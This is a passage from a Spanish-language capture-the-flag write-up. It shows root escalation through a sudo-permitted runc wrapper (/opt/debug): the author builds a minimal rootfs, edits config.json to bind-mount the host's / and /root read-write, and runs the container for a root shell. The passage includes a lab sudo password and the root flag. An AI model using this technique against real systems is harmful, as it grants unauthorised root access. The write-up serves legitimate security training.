   --root value        root directory for storage of container state (this should be located in tmpfs) (default: "/run/runc")
   --criu value        path to the criu binary used for checkpoint and restore (default: "criu")
   --systemd-cgroup    enable systemd cgroup support, expects cgroupsPath to be of form "slice:prefix:name" for e.g. "system.slice:runc:434234"
   --rootless value    ignore cgroup permission errors ('true', 'false', or 'auto') (default: "auto")
   --help, -h          show help
   --version, -v       print the version
```

Veremos que ha funcionado, por lo que con este `help` vamos a investigar como podremos escalar privilegios con dicho binario.

### Explotación binario (root)

Vemos que podremos crear un archivo de configuracion y en el añadir una serie de configuraciones para que nos importe la `/` directamente y con otro comando poder acceder a dicha particion creada.

```shell
cd /tmp
rm -rf getroot
mkdir getroot
cd getroot
```

Habiendo creado todo esto, vamos a generar el archivo de `configuracion` necesario.

```shell
sudo /opt/debug spec
```

Metemos como contraseña `c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T`...

```
Validating sudo...
Please enter the administrative password:

Both passwords verified. Executing the command...
```

Hecho esto ya tendremos el archivo de configuracion preparado, ahora vamos a crear lo necesario para montarnos nuestra propia `raiz` cogiendo binarios y librerias necesarias para que funcione esto.

```shell
# Crear directorio rootfs
mkdir rootfs

# Crear estructura mínima de directorios
mkdir -p rootfs/{bin,lib,lib64,etc,dev,proc,sys,tmp}

# Copiar binarios ESENCIALES (no enlaces)
cp /bin/bash rootfs/bin/
cp /bin/sh rootfs/bin/
cp /bin/ls rootfs/bin/
cp /bin/cat rootfs/bin/
cp /bin/echo rootfs/bin/

# Copiar librerías MÍNIMAS necesarias
cp /lib/x86_64-linux-gnu/libc.so.6 rootfs/lib/
cp /lib/x86_64-linux-gnu/libdl.so.2 rootfs/lib/
cp /lib/x86_64-linux-gnu/libtinfo.so.6 rootfs/lib/
cp /lib64/ld-linux-x86-64.so.2 rootfs/lib64/
```

Ahora vamos a modificar el archivo de configuracion para añadir y modificar secciones que nos interesa para que cargue en la carpeta clonada archivos que nos interesen, en concreto el `/root` sobre todo.

```shell
# Editar config.json
mv config.json.bak
cp config.json.bak config.json
vi config.json

#Dentro del vi
// Resto de configuracion
"args": [
    "/bin/bash"
],
// Resto de configuracion
{
    "destination": "/mnt",
    "type": "bind",
    "source": "/",
    "options": ["rbind", "rw"]
},
// Resto de configuracion
"root": {
    "path": "rootfs",
    "readonly": false
},
// Resto de configuracion
"mounts": [
	{
	    "destination": "/root",
	    "type": "bind",
	    "source": "/root",
	    "options": ["rbind", "rw"]
	},
    {
        "destination": "/mnt",
        "type": "bind",
        "source": "/",
        "options": ["rbind", "rw"]
    },
    // ... los otros mounts que vienen por defecto
],
// Resto de configuracion
```

Ahora vamos a ejecutar el `"contenedor"` que hemos creado de esta forma:

```shell
sudo /opt/debug run getroot
```

Metemos como contraseña `c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T`...

```
Validating sudo...
Please enter the administrative password:

Both passwords verified. Executing the command...
bash-5.1#
```

Con esto veremos que ha funcionado y seremos `root` dentro de dicho contenedor clonado del original, por lo que leeremos la `flag` de `root`.

> root.txt

```
a734356e4bc256dbbf60e337415718b6
```
